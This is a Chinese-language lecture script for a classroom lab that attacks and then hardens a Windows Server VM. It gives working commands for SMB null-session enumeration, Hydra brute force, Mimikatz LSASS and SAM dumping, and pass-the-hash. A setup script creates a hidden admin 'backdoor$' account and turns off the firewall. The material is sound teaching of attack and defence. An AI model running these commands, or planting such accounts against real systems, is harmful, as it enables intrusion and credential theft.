# 实验二：用户账户暴力破解与凭据提取渗透 — 授课逐字稿

> 预计用时：120 分钟（可拆分为 3 课时，每课时 40 分钟）
> 对应章节：项目二 Windows 服务器用户管理
> 实验环境：Kali Linux（攻击机 192.168.1.10）+ Windows Server 2025（靶机 192.168.1.20）

---

## 课时 1：前置知识 + 环境准备 + SMB 空会话枚举（0-40 分钟）

---

### 一、开场与实验目标（0-5 分钟）

好，同学们，上几节课我们学了 Windows 用户管理——怎么建用户、怎么设密码策略、怎么管权限。今天我们换一个视角，不站在管理员的角度，而是站在攻击者的角度，来看看如果密码策略没配好、账户没管好，系统有多脆弱。

今天的实验叫"用户账户暴力破解与凭据提取渗透"。一句话说清楚目标：**从零开始，不需要任何事先知道的密码，只靠一台 Kali 攻击机，逐步拿下 Windows Server 靶机的管理员权限。**

整个实验分五个阶段，形成一条完整的攻击链：

```
SMB空会话枚举 → 暴力破解弱口令 → Mimikatz提取凭据 → 检测隐藏账户 → 密码策略加固
   （拿到用户名）   （拿到密码）     （拿到所有哈希）    （找后门）      （防御闭环）
```

前四个阶段是攻击，第五个阶段是防御。我们既要会攻，也要会防，这样才能真正理解"为什么那些安全策略是必须的"。

---

### 二、前置知识：Windows 认证体系（5-15 分钟）

在动手之前，我先讲三个关键知识点，不然后面的实验你们只会照敲命令，不知道为什么能成功。

**第一个：密码是怎么存的？**

Windows 不会把你的密码明文存在磁盘上。你设的密码 `P@ssw0rd123`，Windows 会用哈希算法算出一个固定长度的值，存在一个叫 SAM 的数据库里。

早期 Windows 用的是 LM Hash，算法是 DES，而且不分大小写、密码截断 14 个字符，非常弱，彩虹表几秒就能破解。所以从 Windows Vista 开始，LM Hash 默认就禁用了，现在全是空的。

现在用的是 NTLM Hash，算法是 MD4，比 LM 强多了，但有一个致命问题——**它没有盐值**。什么意思？就是同样的密码，算出来的 Hash 永远一样。`123456` 在全世界任何一台 Windows 上的 NTLM Hash 都是同一个值。所以攻击者可以提前算好一张"密码→Hash"的对照表，叫彩虹表，查表就能反向找到密码。

更严重的是，NTLM 认证过程中，Hash 本身就可以用来认证，不需要知道明文密码。这就是后面我们要演示的 Pass-the-Hash 攻击。

**第二个：NTLM 认证怎么工作的？**

NTLM 是"挑战-响应"机制，分四步：

1. 客户端说"我是 user1，我要登录"
2. 服务器返回一个 16 字节的随机数，叫"挑战"
3. 客户端用自己的 NTLM Hash 加密这个挑战，把结果发回去，叫"响应"
4. 服务器自己也用存储的 Hash 加密同样的挑战，比对结果，一致就通过

这个机制的问题在哪？**Hash 就在客户端内存里**。攻击者如果能读到内存中的 Hash，就相当于拿到了密码的等价物，甚至不需要破解出明文。

**第三个：LSASS 进程是什么？**

用户登录成功后，Windows 会把认证信息缓存在一个叫 LSASS 的进程里，方便后续操作不需要反复输密码。LSASS 缓存了什么？NTLM Hash、Kerberos 票据、甚至明文密码（旧版 Windows）。

Mimikatz 这个工具干的就是一件事——读取 LSASS 进程的内存，把里面缓存的凭据全部导出来。所以 Mimikatz 能一次性拿到所有已登录用户的密码和 Hash。

---

### 三、实验环境准备（15-25 分钟）

好，知识讲完了，现在开始搭环境。大家把 Windows Server 靶机和 Kali 攻击机都启动，确认两台机器能互相 ping 通。

**第一步：靶机密码策略配置**

这一步非常重要，必须先做，否则后面的弱密码用户创建不了。

在靶机上，按 Win+R，输入 `secpol.msc`，打开本地安全策略：

- 账户策略 → 密码策略：
  - 密码必须符合复杂性要求 → **禁用**
  - 密码长度最小值 → **0 个字符**
  - 密码最长使用期限 → **无限制**
  - 密码最短使用期限 → **0 天**

- 账户策略 → 账户锁定策略：
  - 账户锁定阈值 → **0 次无效登录**（永不锁定）

设完之后，在 CMD 里执行 `gpupdate /force`，让策略立刻生效。用 `net accounts` 确认一下，应该看到密码长度最小值是 0，锁定阈值也是 0。

这些设置是有意为之的——我们要模拟一个"安全策略极其薄弱"的生产服务器。实验最后我们会把这些策略改回来，到时候你们就能对比出差异了。

**第二步：在靶机上运行初始化脚本**

以管理员身份打开 PowerShell，复制运行以下命令：

```powershell
# 创建弱密码测试账户
net user user1 123456 /add
net user user2 password /add
net user user3 P@ssw0rd /add
net user user4 qwerty /add
net user weakadmin admin123 /add
net localgroup Administrators weakadmin /add

# 创建隐藏账户
net user backdoor$ P@ssw0rd123 /add
net localgroup Administrators backdoor$ /add

# 启用远程桌面
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "远程桌面"

# 关闭防火墙（仅实验环境）
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

我来解释一下这些用户：

- `user1` 密码 `123456`——全球最常见弱密码之一
- `user2` 密码 `password`——英文最常见弱密码
- `user3` 密码 `P@ssw0rd`——看起来复杂，其实是经典替换密码
- `user4` 密码 `qwerty`——键盘顺序，很多人爱用
- `weakadmin` 密码 `admin123`——而且加到了管理员组，这是最危险的
- `backdoor$`——以 $ 结尾的隐藏账户，`net user` 看不到它

现在你们在靶机上运行 `net user`，看一下用户列表。有没有 backdoor$？没有对吧？但它确实存在，这就是隐藏账户的可怕之处。

**第三步：确认网络连通**

在 Kali 上：

```bash
ping -c 3 192.168.1.20
```

能通就行。

---

### 四、阶段一：SMB 空会话枚举（25-40 分钟）

好，现在我们正式开始攻击链的第一步——在不知道任何用户名和密码的情况下，获取靶机的用户列表。

**什么是空会话？**

SMB 是 Windows 文件共享协议。默认情况下，Windows 允许匿名用户通过 SMB 连接（叫空会话），读取一些系统信息，包括用户列表。这就好比你没进门，但在门口的公告栏上看到了公司所有员工的名字。

**使用 enum4linux 枚举：**

在 Kali 上执行：

```bash
enum4linux -a 192.168.1.20
```

这个命令会跑一段时间，输出很多信息。大家不用全看，重点找以下几类信息：

- 用户列表（Users）
- 共享资源（Shares）
- 密码策略（Password Policy）

**使用 rpcclient 精确枚举用户：**

```bash
rpcclient -U "" 192.168.1.20 -c "enumdomusers"
```

注意 `-U ""` 就是空用户名，表示匿名连接。`enumdomusers` 是枚举域用户的命令。

你应该能看到 user1、user2、user3、user4、weakadmin，甚至 backdoor$ 都会出现在这里。

**使用 CrackMapExec 枚举：**

```bash
# 枚举用户
crackmapexec smb 192.168.1.20 --users

# 枚举共享
crackmapexec smb 192.168.1.20 --shares

# 查看密码策略
crackmapexec smb 192.168.1.20 --pass-pol
```

密码策略的输出特别重要，大家看一下：

```
[+] Password policy for domain:
  Password length minimum: 0
  Password history length: 0
  Maximum password age: not set
  Account lockout threshold: None
```

看到了吗？密码长度最小值是 0，没有锁定阈值。这意味着我们可以无限次地尝试密码，系统不会锁账号。这就是接下来暴力破解能成功的前提条件。

**再试一个，枚举共享：**

```bash
smbclient -L //192.168.1.20 -N
```

`-N` 表示不需要密码。你应该能看到 IPC$、C$、ADMIN$ 这些默认共享。其中 C$ 就是整个 C 盘，ADMIN$ 是 Windows 系统目录——如果拿到了管理员凭据，就可以直接访问。

**小结阶段一：**

我们做了什么？在没有任何凭据的情况下，拿到了：
1. 用户名列表：user1、user2、user3、user4、weakadmin、backdoor$
2. 密码策略：无复杂度、无长度限制、无锁定
3. 共享资源：C$、ADMIN$ 等敏感共享

有了用户名列表和弱密码策略，下一步就是暴力破解了。这个我们下节课继续。

---

## 课时 2：暴力破解 + Mimikatz 凭据提取（40-80 分钟）

---

### 五、阶段二：密码暴力破解（40-55 分钟）

好，上节课我们通过空会话枚举拿到了用户名列表，还发现密码策略极弱。现在我们要做的是——用字典把这些用户名一个个试，看能不能撞上密码。

**第一步：准备字典文件**

在 Kali 上：

```bash
# 用户名字典
echo -e "user1\nuser2\nuser3\nuser4\nweakadmin\nadministrator" > /tmp/users.txt

# 密码字典
echo -e "123456\npassword\nadmin\nadmin123\nP@ssw0rd\n123456789\nqwerty\nletmein\nwelcome\nmonkey" > /tmp/passwords.txt
```

这些密码都是最常见的弱密码。在真实攻击中，攻击者会用到几万甚至几百万条的大字典，但我们课堂用这个小字典就够了。

**第二步：使用 Hydra 进行 SMB 暴力破解**

```bash
hydra -L /tmp/users.txt -P /tmp/passwords.txt smb://192.168.1.20
```

参数解释：
- `-L` 指定用户名字典
- `-P` 指定密码字典
- `smb://` 表示攻击 SMB 协议

Hydra 会用所有用户名和密码的组合去尝试，6 个用户 × 10 个密码 = 60 次尝试。因为没有锁定策略，全部都能跑完。

等一会儿，你应该能看到类似输出：

```
[445][smb] host: 192.168.1.20   login: user1   password: 123456
[445][smb] host: 192.168.1.20   login: user2   password: password
[445][smb] host: 192.168.1.20   login: user3   password: P@ssw0rd
[445][smb] host: 192.168.1.20   login: weakadmin   password: admin123
```

看到了吗？4 个账号被破解了！其中最关键的是 `weakadmin/admin123`，因为它是管理员组的成员。

**第三步：使用 CrackMapExec 进行密码喷射**

密码喷射是另一种思路——不是用所有密码试一个用户，而是用一个常见密码试所有用户：

```bash
crackmapexec smb 192.168.1.20 -u /tmp/users.txt -p '123456'
crackmapexec smb 192.168.1.20 -u /tmp/users.txt -p 'admin123'
crackmapexec smb 192.168.1.20 -u /tmp/users.txt -p 'password'
```

CrackMapExec 输出中，如果凭据有效，会在前面显示一个绿色的 `[+]`。

**第四步：验证凭据并访问系统**

拿到凭据后，先验证一下能不能用：

```bash
crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' -x "whoami"
crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' -x "net user"
crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' --shares
```

`-x "whoami"` 表示用这个凭据在靶机上执行 whoami 命令。如果返回 `target-server\weakadmin`，说明凭据有效，而且能远程执行命令。

`--shares` 会列出 weakadmin 能访问的所有共享，C$ 和 ADMIN$ 应该都能看到，因为它是管理员。

**第五步：用远程桌面登录**

```bash
xfreerdp3 /v:192.168.1.20 /u:weakadmin /p:admin123 /cert:tofu
```

如果成功，你会看到 Windows 的桌面。现在你已经以管理员身份登录了靶机。

**小结阶段二：**

为什么暴力破解能成功？两个条件缺一不可：
1. 有用户名列表（阶段一通过空会话获得）
2. 没有账户锁定策略（无限次尝试不会被锁）

防御思路也很清楚——要么不让攻击者拿到用户名，要么限制尝试次数。后面阶段五我们会配置这些。

---

### 六、阶段三：Mimikatz 凭据提取（55-75 分钟）

好，现在我们拿到了 weakadmin 的明文密码。但攻击者不会满足于一个账号，他们想要**所有账号**的密码。怎么做到？用 Mimikatz 读取 LSASS 进程内存。

**第一步：将 Mimikatz 传到靶机**

你需要把 mimikatz.exe 放到靶机上。可以通过共享文件夹、远程桌面复制粘贴、或者用 CrackMapExec 上传。假设你已经放到了 `C:\Tools\` 目录。

**第二步：运行 Mimikatz**

在靶机上，右键以管理员身份运行 CMD，进入 Mimikatz 目录：

```cmd
cd C:\Tools
mimikatz.exe
```

**第三步：获取调试权限**

```
privilege::debug
```

预期输出：`Privilege '20' OK`

这个权限叫 SeDebugPrivilege，允许进程调试其他进程。管理员组默认拥有这个权限，但需要显式启用。Mimikatz 用它来读取 LSASS 的内存。

如果这里报错"ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (9)"，说明你不是以管理员身份运行的，需要右键"以管理员身份运行"CMD。

**第四步：提取 LSASS 中的登录凭据**

```
sekurlsa::logonpasswords
```

这个命令会列出 LSASS 中所有已登录会话的凭据。输出会很长，每个会话都会显示：

- 用户名（User Name）
- 域/计算机名（Domain）
- 明文密码（Password，如果可以获取到的话）
- NTLM Hash

大家找一下 weakadmin 的记录，应该能看到明文密码 `admin123` 和一串 NTLM Hash。

这就是 Mimikatz 的威力——**它不需要破解密码，直接从内存里读出来**。只要有管理员权限，一次运行就能拿到所有在线会话的凭据。

**第五步：导出 SAM 数据库中的所有账户 Hash**

```
lsadump::sam
```

这个命令读取磁盘上的 SAM 数据库，导出所有本地账户的 Hash，包括当前没登录的用户。你应该能看到 user1、user2、user3、user4、weakadmin、backdoor$ 全部列出来了。

**第六步：Pass-the-Hash 攻击演示**

现在我们有了一个关键发现——NTLM Hash 本身就可以用来认证，不需要知道明文密码。这叫 Pass-the-Hash（哈希传递）攻击。

在 Mimikatz 中：

```
sekurlsa::pth /user:weakadmin /domain:. /ntlm:你看到的NTLM_Hash值
```

注意 `/ntlm:` 后面只填 32 位十六进制的 NTLM Hash 部分，不要包含 LM Hash 前缀。

执行后会弹出一个新的 CMD 窗口，这个窗口里的所有操作都是以 weakadmin 身份执行的，但不需要输入密码——用的是 Hash。

从 Kali 上也可以做 Pass-the-Hash：

```bash
psexec.py -hashes :NTLM_Hash值 weakadmin@192.168.1.20
wmiexec.py -hashes :NTLM_Hash值 weakadmin@192.168.1.20
```

如果能进入交互式 Shell，说明 PtH 成功了。

**小结阶段三：**

Mimikatz 为什么能成功？因为：
1. LSASS 进程缓存了所有登录凭据
2. 管理员可以读取 LSASS 内存
3. NTLM Hash 可以直接用于认证（Pass-the-Hash）

防御方向：让 LSASS 不能被读取 → RunAsPPL（LSA 保护）+ Credential Guard。后面阶段五会配。

---

## 课时 3：隐藏账户检测 + 加固 + 总结（80-120 分钟）

---

### 七、阶段四：隐藏账户检测（80-90 分钟）

好，现在我们已经拿到了管理员权限。攻击者通常会做什么？建一个后门账号，方便以后再进来。我们之前初始化脚本里已经建了一个——`backdoor$`。

**为什么叫后门？** 因为这个账号以 `$` 结尾，`net user` 看不到它，登录界面也不显示它。普通管理员如果不特意检查，根本不知道这个账号存在。

来，我们对比几种检测方法：

**方法一：net user（看不到）**

在靶机上：

```cmd
net user
```

看输出，有没有 backdoor$？没有。这就是隐藏账户的"隐藏"效果。

**方法二：wmic（看得到）**

```cmd
wmic useraccount list full | findstr backdoor
```

能看到！wmic 是直接查 WMI 数据库，绕过了 net user 的显示过滤。

**方法三：PowerShell（看得到）**

```powershell
Get-LocalUser | Select-Object Name, Enabled, Description
```

backdoor$ 也会出现在列表中。

**方法四：注册表（最彻底）**

```cmd
reg query "HKLM\SAM\SAM\Domains\Account\Users\Names"
```

这需要 SYSTEM 权限，但能看到最完整的用户列表，包括所有隐藏账户。

**方法五：从 Kali 远程检测**

```bash
crackmapexec smb 192.168.1.20 -u weakadmin -p 'admin123' --users
```

CrackMapExec 用管理员凭据远程查询，也会列出包括 backdoor$ 在内的所有用户。

**清理隐藏账户：**

```cmd
net user backdoor$ /delete
```

删除后用 `wmic useraccount list full` 确认已经不存在了。

**关键结论**：隐藏账户只对 `net user` 和登录界面有效。对于 wmic、PowerShell、注册表查询、远程枚举，它根本不隐藏。所以不要以为 `$` 后缀就安全了，这只是最低级的隐藏手段。

---

### 八、阶段五：密码策略加固与验证（90-110 分钟）

好，前面四个阶段我们走完了完整的攻击链。现在我们要切换到防御方视角——把这些漏洞一个一个堵上，然后验证防御是否有效。

**防御矩阵回顾：**

| 攻击阶段 | 利用的弱点 | 加固措施 |
|----------|-----------|---------|
| 空会话枚举 | 允许匿名 SMB | 关闭匿名访问 |
| 暴力破解 | 无密码复杂度/无锁定 | 强密码策略 + 锁定阈值 |
| Mimikatz | LSASS 可被调试读取 | RunAsPPL |
| Pass-the-Hash | NTLM Hash 可重放 | Protected Users 组 |
| 隐藏账户 | $ 后缀不易发现 | 定期审计 |

**加固 1：配置强密码策略**

在靶机上，打开 `secpol.msc`：

密码策略：
- 密码必须符合复杂性要求 → **启用**
- 密码长度最小值 → **8 个字符**（建议 12）
- 密码最长使用期限 → **90 天**
- 强制密码历史 → **5 个**

账户锁定策略：
- 账户锁定阈值 → **5 次**
- 账户锁定时间 → **15 分钟**
- 复位账户锁定计数器的时间间隔 → **15 分钟**

设完之后执行 `gpupdate /force`，然后用 `net accounts` 验证。

也可以用命令行：

```cmd
net accounts /minpwlen:8 /maxpwage:90 /uniquepw:5 /lockoutthreshold:5 /lockoutduration:15
gpupdate /force
net accounts
```

**加固 2：启用 LSA 保护**

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

RunAsPPL 让 LSASS 以"受保护进程"运行，调试 API 无法读取它的内存。Mimikatz 的 `privilege::debug` + `sekurlsa::logonpasswords` 这条攻击路径就被堵死了。

需要重启生效：

```powershell
Restart-Computer -Force
```

重启后验证：

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

应输出 `RunAsPPL    REG_DWORD    0x1`。

**验证加固效果：**

现在回到 Kali，验证防御是否生效。

验证 1——密码策略已生效：

```bash
crackmapexec smb 192.168.1.20 --pass-pol
```

现在应该能看到密码长度最小值是 8，锁定阈值是 5 了。

验证 2——暴力破解被限制：

```bash
hydra -l user1 -P /tmp/passwords.txt smb://192.168.1.20 -t 1 -w 5
```

尝试 5 次后，账户应该被锁定了，后续尝试都会失败。

验证 3——Mimikatz 被阻止：

在靶机上重新运行 Mimikatz：

```
privilege::debug
```

如果 RunAsPPL 生效了，这一步可能会成功（因为调试权限和 LSA 保护是两回事），但：

```
sekurlsa::logonpasswords
```

应该会报错，提示无法读取 LSASS 内存。这就是 LSA 保护的效果。

注意：在课堂虚拟机环境中，RunAsPPL 的效果可能因虚拟化配置而异。如果没有完全生效，可以额外启用 Credential Guard（需要 TPM 2.0 + Secure Boot，虚拟机可能不支持），作为知识扩展了解即可。

---

### 九、实验总结与报告要求（110-120 分钟）

好，我们来做一个完整的回顾。今天的实验从"一个 IP 地址"开始，最终拿到了"所有用户的密码和 Hash"，然后又把这些漏洞全部堵上了。

**攻击链回顾：**

1. **空会话枚举** → 一个 IP 就能拿到用户名列表和密码策略
2. **暴力破解** → 用户名 + 弱密码字典 = 有效凭据
3. **Mimikatz** → 管理员权限 = 读取 LSASS = 所有凭据
4. **Pass-the-Hash** → Hash = 密码等价物，不需要明文
5. **隐藏账户** → `$` 后缀对 net user 不可见，但可被其他方法检测

**防御链回顾：**

1. 关闭 SMB 匿名访问 → 阻断枚举
2. 强密码策略 + 账户锁定 → 阻断暴力破解
3. RunAsPPL → 阻断 Mimikatz 读取 LSASS
4. Protected Users 组 → 限制凭据缓存
5. 定期审计 wmic / Get-LocalUser → 发现隐藏账户

**每一个攻击手段，都对应一个防御措施。** 这就是安全的核心逻辑——你不了解攻击，就做不好防御。

**实验报告要求：**

请按攻击链的五个阶段顺序，记录以下内容：

1. 枚举结果——空会话枚举到的用户列表和共享资源
2. 爆破结果——Hydra/CrackMapExec 成功破解的账户密码
3. Mimikatz 输出——提取到的明文密码和 NTLM Hash
4. 隐藏账户检测——检测到 backdoor$ 的方法和结果
5. 加固前后对比——密码策略配置前后爆破效果的差异

**思考题：**

1. 为什么关闭密码复杂度要求和账户锁定策略是极其危险的？
2. Pass-the-Hash 攻击为什么能成功？如何从根本上防御？
3. LSA 保护（RunAsPPL）如何阻止 Mimikatz 获取凭据？
4. 隐藏账户（$ 后缀）有哪些检测方法？如何彻底防御？
5. 企业环境中应如何配置密码策略才能在安全性和可用性之间取得平衡？

**最后提醒**：本实验的所有技术仅限在授权的教学环境中使用。对任何未授权系统进行暴力破解或凭据提取属于违法行为。今天学这些是为了保护系统，不是为了攻击别人。

好，下课。
